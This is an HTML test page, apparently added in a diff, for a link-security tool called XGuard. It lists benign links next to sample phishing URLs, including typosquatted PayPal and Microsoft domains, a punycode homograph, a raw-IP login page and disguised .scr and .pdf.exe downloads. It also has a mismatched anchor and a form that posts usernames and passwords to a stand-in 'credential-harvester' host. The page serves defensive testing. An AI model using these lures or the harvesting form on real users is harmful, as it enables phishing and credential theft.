@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XGuard: Comprehensive Test Suite Environment</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;700;800&family=JetBrains+Mono:wght@500&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #07090E;
+      --card: rgba(15, 23, 42, 0.7);
+      --border: rgba(255, 255, 255, 0.08);
+      --cyan: #00F2FE;
+      --red: #EF4444;
+      --amber: #F59E0B;
+      --green: #10B981;
+      --text: #F8FAFC;
+      --muted: #94A3B8;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Outfit', sans-serif;
+      padding: 40px 20px;
+      display: flex;
+      justify-content: center;
+    }
+    .container {
+      width: 100%;
+      max-width: 860px;
+      display: flex;
+      flex-direction: column;
+      gap: 24px;
+    }
+    header { text-align: center; margin-bottom: 12px; }
+    h1 { font-size: 26px; font-weight: 800; color: #FFF; margin-bottom: 6px; }
+    p.sub { font-size: 14px; color: var(--muted); }
+    .test-section {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 14px;
+      padding: 20px;
+    }
+    h2 { font-size: 16px; font-weight: 700; margin-bottom: 14px; display: flex; align-items: center; gap: 8px; }
+    .badge { font-size: 10px; font-weight: 700; padding: 2px 8px; border-radius: 4px; text-transform: uppercase; }
+    .badge-safe { background: rgba(16, 185, 129, 0.2); color: #34D399; }
+    .badge-danger { background: rgba(239, 68, 68, 0.2); color: #F87171; }
+    .badge-warn { background: rgba(245, 158, 11, 0.2); color: #FBBF24; }
+    .links-grid { display: flex; flex-direction: column; gap: 10px; }
+    .link-card {
+      background: rgba(0, 0, 0, 0.35);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 12px 16px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 16px;
+    }
+    .link-details { display: flex; flex-direction: column; gap: 3px; overflow: hidden; }
+    .link-title { font-size: 13px; font-weight: 600; color: #E2E8F0; }
+    a { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--cyan); text-decoration: underline; word-break: break-all; }
+    .expected { font-size: 11px; color: var(--muted); white-space: nowrap; }
+    form { display: flex; flex-direction: column; gap: 10px; margin-top: 10px; }
+    input[type="text"], input[type="password"] {
+      background: rgba(0, 0, 0, 0.4); border: 1px solid var(--border); border-radius: 6px; padding: 8px 12px; color: #FFF; font-family: inherit; font-size: 12px;
+    }
+    button.demo-submit {
+      background: var(--red); color: #FFF; border: none; padding: 8px 14px; border-radius: 6px; font-weight: 600; cursor: pointer; width: fit-content;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <h1>XGuard: Test Suite Environment</h1>
+      <p class="sub">Controlled testing matrix for validating click interception, ML detection, safe navigation, and warning pages.</p>
+    </header>
+
+    <!-- SECTION 1: BENIGN TEST LINKS -->
+    <div class="test-section">
+      <h2><span class="badge badge-safe">Category 1</span> Benign Verified Websites</h2>
+      <div class="links-grid">
+        <div class="link-card">
+          <div class="link-details">
+            <span class="link-title">Google Search Query</span>
+            <a href="https://www.google.com/search?q=threatguard+security">https://www.google.com/search?q=threatguard+security</a>
+          </div>
+          <span class="expected">Expected: Seamless Navigation (Low Risk)</span>
+        </div>
+        <div class="link-card">
+          <div class="link-details">
+            <span class="link-title">Python Software Foundation</span>
+            <a href="https://www.python.org/doc/">https://www.python.org/doc/</a>
+          </div>
+          <span class="expected">Expected: Seamless Navigation (Low Risk)</span>
+        </div>
+        <div class="link-card">
+          <div class="link-details">
+            <span class="link-title">Wikipedia Technical Article</span>
+            <a href="https://en.wikipedia.org/wiki/Transport_Layer_Security">https://en.wikipedia.org/wiki/Transport_Layer_Security</a>
+          </div>
+          <span class="expected">Expected: Seamless Navigation (Low Risk)</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- SECTION 2: BRAND IMPERSONATION & TYPOSQUATTING -->
+    <div class="test-section">
+      <h2><span class="badge badge-danger">Category 2</span> Brand Impersonation & Typosquatting</h2>
+      <div class="links-grid">
+        <div class="link-card">
+          <div class="link-details">
+            <span class="link-title">Subdomain PayPal Deception</span>
+            <a href="http://paypal.com.account-verification-service.net/login.php?urgent=1">http://paypal.com.account-verification-service.net/login.php?urgent=1</a>
+          </div>
+          <span class="expected" style="color:#F87171;">Expected: Blocked &rarr; Warning Page</span>
+        </div>
+        <div class="link-card">
+          <div class="link-details">
+            <span class="link-title">Typosquatting Character Substitution (paypa1)</span>
+            <a href="http://www.paypa1.com/cgi-bin/webscr?cmd=_login">http://www.paypa1.com/cgi-bin/webscr?cmd=_login</a>
+          </div>
+          <span class="expected" style="color:#F87171;">Expected: Blocked &rarr; Warning Page</span>
+        </div>
+        <div class="link-card">
+          <div class="link-details">
+            <span class="link-title">Lookalike Microsoft Portal (micros0ft)</span>
+            <a href="https://micros0ft.com/en-us/security/renew-license">https://micros0ft.com/en-us/security/renew-license</a>
+          </div>
+          <span class="expected" style="color:#F87171;">Expected: Blocked &rarr; Warning Page</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- SECTION 3: RAW IP HOSTS & HOMOGRAPH ATTACKS -->
+    <div class="test-section">
+      <h2><span class="badge badge-danger">Category 3</span> IP Hosts & Punycode Homographs</h2>
+      <div class="links-grid">
+        <div class="link-card">
+          <div class="link-details">
+            <span class="link-title">Raw IPv4 Host with Non-Standard Port</span>
+            <a href="http://194.26.29.112:8080/secure/login.php">http://194.26.29.112:8080/secure/login.php</a>
+          </div>
+          <span class="expected" style="color:#F87171;">Expected: Blocked &rarr; Warning Page</span>
+        </div>
+        <div class="link-card">
+          <div class="link-details">
+            <span class="link-title">Punycode Homograph (xn--pypal)</span>
+            <a href="http://xn--pypal-4ve.com/signin/webscr">http://xn--pypal-4ve.com/signin/webscr</a>
+          </div>
+          <span class="expected" style="color:#F87171;">Expected: Blocked &rarr; Warning Page</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- SECTION 4: DANGEROUS DOWNLOADS -->
+    <div class="test-section">
+      <h2><span class="badge badge-danger">Category 4</span> Dangerous Payload Endpoints</h2>
+      <div class="links-grid">
+        <div class="link-card">
+          <div class="link-details">
+            <span class="link-title">Executable Script Extension (.scr)</span>
+            <a href="http://system-speedup-utility.download-hub.cc/driver_update.scr">http://system-speedup-utility.download-hub.cc/driver_update.scr</a>
+          </div>
+          <span class="expected" style="color:#F87171;">Expected: Critical Risk Block</span>
+        </div>
+        <div class="link-card">
+          <div class="link-details">
+            <span class="link-title">Double Extension Disguise (.pdf.exe)</span>
+            <a href="http://bank-statement-archive.file-storage-direct.top/statement_q3.pdf.exe">http://bank-statement-archive.file-storage-direct.top/statement_q3.pdf.exe</a>
+          </div>
+          <span class="expected" style="color:#F87171;">Expected: Critical Risk Block</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- SECTION 5: DECEPTIVE ANCHOR TEXT & CROSS-DOMAIN FORMS -->
+    <div class="test-section">
+      <h2><span class="badge badge-warn">Category 5</span> Live Webpage DOM Signals</h2>
+      <div class="links-grid">
+        <div class="link-card">
+          <div class="link-details">
+            <span class="link-title">Deceptive Anchor Text Mismatch</span>
+            <a href="http://suspicious-collector-node.net/gateway">https://www.paypal.com/signin</a>
+          </div>
+          <span class="expected">Text says paypal.com, href points elsewhere!</span>
+        </div>
+      </div>
+
+      <h3 style="font-size:13px; color:var(--muted); margin-top:16px;">Test Cross-Domain Credential Submission Form:</h3>
+      <form action="http://unauthorized-credential-harvester.xyz/submit.php" method="POST">
+        <input type="text" name="username" placeholder="Username / Email" />
+        <input type="password" name="password" placeholder="Password" />
+        <button type="submit" class="demo-submit">Submit Form to External Domain</button>
+      </form>
+    </div>
+  </div>
+</body>
+</html>
